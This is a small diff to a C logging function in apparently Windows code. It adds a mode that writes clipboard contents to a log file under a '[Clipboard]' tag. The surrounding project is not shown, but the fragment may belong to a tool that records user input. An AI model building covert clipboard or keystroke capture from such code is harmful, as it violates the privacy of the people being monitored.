@@ -13,5 +13,7 @@ VOID log(void *toLog, int MODE, BOOL putDate)
         fprintf(f, "%s", (LPSTR)toLog);
     else if (MODE == WCHAR_MODE)
         fprintf(f, "%ws", (WCHAR *)toLog);
+    else if (MODE == CLPB_MODE)
+        fprintf(f, "[Clipboard] %s\n", (LPSTR)toLog);
     fclose(f);
 }
